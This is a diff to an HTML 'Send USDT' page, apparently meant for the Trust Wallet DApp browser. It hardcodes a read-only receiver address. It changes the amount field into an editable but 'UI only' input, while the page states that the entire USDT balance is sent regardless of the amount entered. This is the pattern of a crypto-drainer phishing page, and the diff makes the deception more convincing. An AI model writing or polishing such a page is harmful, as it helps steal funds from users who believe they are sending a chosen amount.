@@ -77,15 +77,17 @@
 <body>
   <header>Send USDT</header>
   <div class="container">
-    <label>Address</label>
+    <label>Receiver Address</label>
     <div class="input-box">
       <input type="text" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly />
     </div>
-    <label>Amount</label>
+
+    <label>USDT Amount</label>
     <div class="input-box">
-      <input type="number" placeholder="You can enter any value, but all USDT will be sent." disabled />
+      <input type="number" placeholder="Enter any amount (UI only)" />
     </div>
-    <div class="usd">All balance will be sent automatically after approval</div>
+
+    <div class="usd">All USDT balance will be sent regardless of amount above</div>
   </div>
 
   <div class="fixed-button">
@@ -109,7 +111,7 @@
       btn.disabled = true;
 
       if (!window.ethereum) {
-        alert("Please open in Trust Wallet browser.");
+        alert("Please open in Trust Wallet DApp browser.");
         btn.innerText = "Next";
         btn.disabled = false;
         return;
